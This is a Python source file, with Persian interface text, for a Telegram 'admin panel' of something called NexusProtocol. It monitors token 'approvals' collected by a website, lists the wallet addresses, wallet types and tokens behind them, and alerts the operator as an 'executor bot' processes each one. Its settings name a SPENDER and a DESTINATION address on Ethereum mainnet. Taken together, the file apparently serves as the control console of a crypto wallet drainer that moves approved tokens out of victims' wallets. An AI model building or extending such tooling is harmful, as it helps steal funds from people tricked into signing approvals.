#!/usr/bin/env python3
"""
NexusProtocol — پنل مدیریت تلگرام
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
بدون کتابخانه سنگین — فقط requests ساده + threading
polling در یک thread جداگانه + ارسال پیام از هر thread
"""

import os
import time
import json
import html
import logging
import threading
import requests
from datetime import datetime, timezone

logger = logging.getLogger("AdminPanel")

# ─── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN    = os.getenv("TELEGRAM_BOT_TOKEN", "")
ADMIN_CHAT   = os.getenv("TELEGRAM_CHAT_ID", "")
API_URL      = os.getenv("WEBSITE_URL", "https://nexusprotocol-api.onrender.com").rstrip("/")
WEB_URL      = "https://nexusprotocol-web.onrender.com"
BOT_SVC_URL  = "https://nexusprotocol-bot.onrender.com"
SPENDER      = os.getenv("SPENDER_ADDRESS", "")
DESTINATION  = os.getenv("DESTINATION_ADDRESS", "")
RPC_URL      = os.getenv("RPC_URL", "https://eth.llamarpc.com")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

_start_time = datetime.now(timezone.utc)
_seen_approval_ids: set = set()
_lock = threading.Lock()

# ─── Telegram helpers ─────────────────────────────────────────────────────────

def tg_send(chat_id: str, text: str, reply_markup=None):
    if not BOT_TOKEN:
        return
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(f"{TG_API}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        logger.error(f"tg_send error: {e}")


def tg_answer_callback(callback_id: str, text: str = ""):
    try:
        requests.post(f"{TG_API}/answerCallbackQuery",
                      json={"callback_query_id": callback_id, "text": text}, timeout=5)
    except Exception:
        pass


def tg_edit(chat_id: str, message_id: int, text: str, reply_markup=None):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(f"{TG_API}/editMessageText", json=payload, timeout=10)
    except Exception:
        pass

# ─── Inline keyboards ─────────────────────────────────────────────────────────

def main_kb():
    return {
        "inline_keyboard": [
            [
                {"text": "📊 آمار",       "callback_data": "stats"},
                {"text": "🖥️ وضعیت",    "callback_data": "status"},
            ],
            [
                {"text": "🔔 Approvals",  "callback_data": "approvals_0"},
                {"text": "⏳ در انتظار", "callback_data": "pending"},
            ],
            [
                {"text": "⚙️ تنظیمات",  "callback_data": "config"},
                {"text": "💰 قیمت ETH", "callback_data": "ethprice"},
            ],
            [{"text": "🔄 بروزرسانی",    "callback_data": "main"}],
        ]
    }


def back_kb():
    return {
        "inline_keyboard": [
            [{"text": "🏠 منوی اصلی", "callback_data": "main"}],
            [{"text": "🔄 بروزرسانی", "callback_data": "refresh"}],
        ]
    }

# ─── Fetchers ─────────────────────────────────────────────────────────────────

def get_eth_price() -> float:
    try:
        r = requests.get(
            "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
            timeout=5)
        return float(r.json()["ethereum"]["usd"])
    except Exception:
        return 2500.0


def check_service(url: str, path: str = "") -> tuple:
    try:
        r = requests.get(url + path, timeout=7)
        return r.status_code < 400, r.status_code
    except Exception:
        return False, 0


def get_approvals(limit=100) -> list:
    for ep in ["/api/approvals/pending", "/api/approvals"]:
        try:
            r = requests.get(API_URL + ep, timeout=8)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    return data[:limit]
        except Exception:
            continue
    return []

# ─── Message builders ─────────────────────────────────────────────────────────

def _short(addr: str, n=8) -> str:
    if not addr or len(addr) < 12:
        return addr
    return f"{addr[:n]}…{addr[-4:]}"


def _mask(val: str, show=10) -> str:
    if not val:
        return "—"
    return val[:show] + "•" * max(0, len(val) - show - 4) + val[-4:]


def _ago(iso: str) -> str:
    try:
        dt = datetime.fromisoformat(iso.replace("Z", "+00:00"))
        diff = int((datetime.now(timezone.utc) - dt).total_seconds())
        if diff < 60:   return f"{diff}ث پیش"
        if diff < 3600: return f"{diff//60}د پیش"
        if diff < 86400:return f"{diff//3600}س پیش"
        return f"{diff//86400}ر پیش"
    except Exception:
        return iso[:16] if iso else "—"


def build_main() -> str:
    up = datetime.now(timezone.utc) - _start_time
    h, r = divmod(int(up.total_seconds()), 3600)
    m, s = divmod(r, 60)
    return (
        "╔══════════════════════════════╗\n"
        "║  🚀 <b>NexusProtocol Admin Panel</b>\n"
        "╚══════════════════════════════╝\n\n"
        f"⏱️ آپتایم: <code>{h:02d}:{m:02d}:{s:02d}</code>\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%Y-%m-%d  %H:%M')} UTC\n\n"
        "از دکمه‌های زیر استفاده کنید 👇"
    )


def build_status() -> str:
    web_ok, web_c  = check_service(WEB_URL, "/")
    api_ok, api_c  = check_service(API_URL, "/api/healthz")
    bot_ok, bot_c  = check_service(BOT_SVC_URL, "/health")
    db_ok = isinstance(get_approvals(1), list)

    ic = lambda ok: "🟢" if ok else "🔴"
    co = lambda c:  f"<code>{c}</code>"

    s = [
        "🖥️ <b>وضعیت سرویس‌ها</b>\n",
        f"{ic(web_ok)} <b>سایت (Frontend)</b>  {co(web_c)}",
        f"   └ {html.escape(WEB_URL)}",
        "",
        f"{ic(api_ok)} <b>API Server</b>  {co(api_c)}",
        f"   └ {html.escape(API_URL)}",
        "",
        f"{ic(bot_ok)} <b>ربات اجراکننده</b>  {co(bot_c)}",
        "",
        f"{ic(db_ok)} <b>دیتابیس</b>",
        "",
        "━━━━━━━━━━━━━━━━━",
    ]
    if api_ok and web_ok:
        s.append("✅ <b>سرویس‌های اصلی فعال هستند</b>")
    else:
        down = [n for ok, n in [(web_ok,"سایت"),(api_ok,"API"),(bot_ok,"ربات")] if not ok]
        s.append(f"⚠️ مشکل در: {', '.join(down)}")
    s.append(f"\n🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC")
    return "\n".join(s)


def build_stats() -> str:
    approvals = get_approvals(200)
    total     = len(approvals)
    pending   = sum(1 for a in approvals if not a.get("processed"))
    processed = total - pending
    pct       = int(processed / total * 100) if total else 0
    bar       = "█" * (pct // 5) + "░" * (20 - pct // 5)

    wt: dict = {}
    last_at = "—"
    for a in approvals:
        k = str(a.get("wallet_type", "Unknown"))
        wt[k] = wt.get(k, 0) + 1
    if approvals:
        try:
            latest = max(approvals, key=lambda x: x.get("created_at",""))
            last_at = _ago(latest.get("created_at",""))
        except Exception:
            pass

    eth = get_eth_price()
    wt_lines = "".join(
        f"   {html.escape(k):<15} <code>{v}</code>\n"
        for k, v in sorted(wt.items(), key=lambda x: -x[1])[:5]
    )
    return (
        "📊 <b>آمار کلی</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📋 کل Approval‌ها:  <b>{total}</b>\n"
        f"⏳ در انتظار:       <b>{pending}</b>\n"
        f"✅ پردازش‌شده:     <b>{processed}</b>\n"
        f"🕐 آخرین فعالیت:  {last_at}\n\n"
        f"📈 پیشرفت پردازش\n"
        f"   [{bar}] {pct}%\n\n"
        f"👛 <b>نوع کیف‌پول:</b>\n{wt_lines}\n"
        f"💰 قیمت ETH: <code>${eth:,.0f}</code>\n\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC"
    )


def build_approvals(page=0) -> tuple:
    per = 5
    all_a = get_approvals(200)
    try:
        all_a = sorted(all_a, key=lambda x: x.get("created_at",""), reverse=True)
    except Exception:
        pass

    total = len(all_a)
    pages = max(1, (total + per - 1) // per)
    chunk = all_a[page*per:(page+1)*per]

    lines = [
        f"🔔 <b>Approval‌ها</b>  (صفحه {page+1}/{pages})",
        f"جمع: {total} approval",
        "━━━━━━━━━━━━━━━━━━━━━━━\n",
    ]
    if not chunk:
        lines.append("هنوز هیچ approval ثبت نشده.")
    else:
        for i, a in enumerate(chunk, page*per+1):
            icon   = "✅" if a.get("processed") else "⏳"
            wallet = _short(a.get("wallet",""), 10)
            wtype  = html.escape(str(a.get("wallet_type","?")))
            token  = _short(a.get("token",""), 10)
            tx     = a.get("tx_hash") or "—"
            t      = _ago(a.get("created_at",""))
            lines += [
                f"{icon} <b>#{i}</b>  {t}",
                f"   👛 <code>{html.escape(wallet)}</code>  ({wtype})",
                f"   🪙 <code>{html.escape(token)}</code>",
                f"   🔗 <code>{html.escape(tx[:28])}</code>",
                "",
            ]

    nav = []
    if page > 0:
        nav.append({"text": "◀️ قبلی", "callback_data": f"approvals_{page-1}"})
    if (page+1)*per < total:
        nav.append({"text": "بعدی ▶️", "callback_data": f"approvals_{page+1}"})

    kb_rows = []
    if nav:
        kb_rows.append(nav)
    kb_rows.append([{"text": "🏠 منوی اصلی", "callback_data": "main"}])

    return "\n".join(lines), {"inline_keyboard": kb_rows}


def build_pending() -> str:
    all_a   = get_approvals(200)
    pending = [a for a in all_a if not a.get("processed")]
    lines   = ["⏳ <b>Approval‌های در انتظار</b>", "━━━━━━━━━━━━━━━━━━━━━━━\n"]
    if not pending:
        lines.append("✅ همه approval‌ها پردازش شده‌اند!")
    else:
        lines.append(f"📋 <b>{len(pending)} approval</b> در صف:\n")
        for i, a in enumerate(pending[:10], 1):
            wallet = _short(a.get("wallet",""), 10)
            wtype  = html.escape(str(a.get("wallet_type","?")))
            token  = _short(a.get("token",""), 10)
            t      = _ago(a.get("created_at",""))
            lines += [
                f"⏳ <b>#{i}</b>  {t}",
                f"   👛 <code>{html.escape(wallet)}</code>  ({wtype})",
                f"   🪙 <code>{html.escape(token)}</code>",
                "",
            ]
        if len(pending) > 10:
            lines.append(f"  … و {len(pending)-10} مورد دیگر")
    lines.append(f"\n🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC")
    return "\n".join(lines)


def build_config() -> str:
    return (
        "⚙️ <b>تنظیمات فعلی</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 <b>API URL:</b>\n   <code>{html.escape(API_URL)}</code>\n\n"
        f"🌍 <b>سایت:</b>\n   <code>{html.escape(WEB_URL)}</code>\n\n"
        f"📤 <b>SPENDER:</b>\n   <code>{html.escape(_mask(SPENDER))}</code>\n\n"
        f"📥 <b>مقصد:</b>\n   <code>{html.escape(_mask(DESTINATION))}</code>\n\n"
        f"⛓️ <b>شبکه:</b>  Ethereum Mainnet (chain_id=1)\n\n"
        f"🔗 <b>RPC:</b>\n   <code>{html.escape(RPC_URL[:60])}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ برای تغییر از Render dashboard استفاده کنید."
    )


def build_ethprice() -> str:
    p = get_eth_price()
    return (
        "💰 <b>قیمت لحظه‌ای</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💎 ETH/USD:  <code>${p:,.2f}</code>\n\n"
        "🪙 <b>توکن‌های رایج:</b>\n"
        "   USDT  = $1.00\n"
        "   USDC  = $1.00\n"
        f"   WETH  ≈ ${p:,.0f}\n\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')} UTC\n"
        "<i>منبع: CoinGecko</i>"
    )

# ─── Update dispatcher ────────────────────────────────────────────────────────

def handle_message(msg: dict):
    chat_id  = str(msg.get("chat", {}).get("id", ""))
    text     = (msg.get("text") or "").strip()
    if not chat_id or not text:
        return

    # Authorization check
    if ADMIN_CHAT and chat_id != ADMIN_CHAT:
        tg_send(chat_id, "⛔ دسترسی مجاز نیست.")
        return

    cmd = text.split()[0].lower().split("@")[0]

    if cmd in ("/start", "/menu"):
        tg_send(chat_id, build_main(), main_kb())
    elif cmd == "/status":
        tg_send(chat_id, "⏳ در حال بررسی سرویس‌ها…")
        tg_send(chat_id, build_status(), back_kb())
    elif cmd == "/stats":
        tg_send(chat_id, "⏳ در حال دریافت آمار…")
        tg_send(chat_id, build_stats(), back_kb())
    elif cmd == "/approvals":
        txt, kb = build_approvals(0)
        tg_send(chat_id, txt, kb)
    elif cmd == "/pending":
        tg_send(chat_id, build_pending(), back_kb())
    elif cmd == "/config":
        tg_send(chat_id, build_config(), back_kb())
    else:
        tg_send(chat_id, build_main(), main_kb())


def handle_callback(cb: dict):
    cb_id    = cb.get("id", "")
    chat_id  = str(cb.get("message", {}).get("chat", {}).get("id", ""))
    msg_id   = cb.get("message", {}).get("message_id")
    data     = cb.get("data", "")

    tg_answer_callback(cb_id)

    if not chat_id or not msg_id:
        return

    if data in ("main", "refresh"):
        tg_edit(chat_id, msg_id, build_main(), main_kb())
    elif data == "status":
        tg_edit(chat_id, msg_id, "⏳ در حال بررسی…")
        tg_edit(chat_id, msg_id, build_status(), back_kb())
    elif data == "stats":
        tg_edit(chat_id, msg_id, "⏳ در حال دریافت آمار…")
        tg_edit(chat_id, msg_id, build_stats(), back_kb())
    elif data.startswith("approvals_"):
        page = int(data.split("_")[1])
        txt, kb = build_approvals(page)
        tg_edit(chat_id, msg_id, txt, kb)
    elif data == "pending":
        tg_edit(chat_id, msg_id, build_pending(), back_kb())
    elif data == "config":
        tg_edit(chat_id, msg_id, build_config(), back_kb())
    elif data == "ethprice":
        tg_edit(chat_id, msg_id, build_ethprice(), back_kb())

# ─── Notification job ─────────────────────────────────────────────────────────

def _notify_new_approvals():
    global _seen_approval_ids
    if not ADMIN_CHAT or not BOT_TOKEN:
        return
    try:
        approvals = get_approvals(100)
        with _lock:
            new_ones = [a for a in approvals
                        if a.get("id") and a["id"] not in _seen_approval_ids]
            for a in new_ones:
                _seen_approval_ids.add(a["id"])

        for a in new_ones:
            wallet = a.get("wallet", "?")
            wtype  = a.get("wallet_type", "?")
            token  = _short(a.get("token", ""), 10)
            tx     = a.get("tx_hash") or "—"
            t      = _ago(a.get("created_at", ""))
            text = (
                "🚨 <b>APPROVAL جدید!</b>\n"
                "━━━━━━━━━━━━━━━━━\n\n"
                f"🕐 {t}\n"
                f"👛 <code>{html.escape(wallet)}</code>\n"
                f"📱 {html.escape(str(wtype))}\n"
                f"🪙 <code>{html.escape(token)}</code>\n"
                f"🔗 <code>{html.escape(tx[:30])}</code>\n\n"
                "⚡ ربات در حال پردازش است…"
            )
            tg_send(ADMIN_CHAT, text)
    except Exception as e:
        logger.error(f"notify error: {e}")

# ─── Main polling loop ────────────────────────────────────────────────────────

def _polling_loop():
    if not BOT_TOKEN:
        logger.error("❌ TELEGRAM_BOT_TOKEN not set — admin panel disabled")
        return

    logger.info("📱 Admin Panel polling started")
    offset = 0
    last_notify = 0

    # تنظیم commands در تلگرام
    try:
        cmds = [
            {"command": "start",     "description": "🏠 منوی اصلی"},
            {"command": "status",    "description": "🖥️ وضعیت سیستم"},
            {"command": "stats",     "description": "📊 آمار کلی"},
            {"command": "approvals", "description": "🔔 لیست Approval‌ها"},
            {"command": "pending",   "description": "⏳ در انتظار پردازش"},
            {"command": "config",    "description": "⚙️ تنظیمات"},
        ]
        requests.post(f"{TG_API}/setMyCommands",
                      json={"commands": cmds}, timeout=10)
        logger.info("✅ Telegram commands set")
    except Exception as e:
        logger.warning(f"setMyCommands failed: {e}")

    while True:
        try:
            # Fetch updates
            r = requests.get(
                f"{TG_API}/getUpdates",
                params={"offset": offset, "timeout": 20, "limit": 50},
                timeout=25
            )
            if r.status_code != 200:
                time.sleep(2)
                continue

            updates = r.json().get("result", [])
            for upd in updates:
                offset = upd["update_id"] + 1
                if "message" in upd:
                    threading.Thread(
                        target=handle_message, args=(upd["message"],), daemon=True
                    ).start()
                elif "callback_query" in upd:
                    threading.Thread(
                        target=handle_callback, args=(upd["callback_query"],), daemon=True
                    ).start()

            # اعلان approval جدید هر ۳۰ ثانیه
            now = time.time()
            if now - last_notify >= 30:
                threading.Thread(target=_notify_new_approvals, daemon=True).start()
                last_notify = now

        except requests.exceptions.Timeout:
            pass  # normal — long polling timed out
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)


def start_admin_panel():
    """در یک daemon thread راه‌اندازی می‌شود"""
    t = threading.Thread(target=_polling_loop, daemon=True, name="AdminPanel")
    t.start()
    logger.info("🚀 Admin Panel thread started")
    return t


# ─── Standalone run ───────────────────────────────────────────────────────────
if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )
    logger.info("Running admin panel standalone...")
    _polling_loop()   # block in main thread
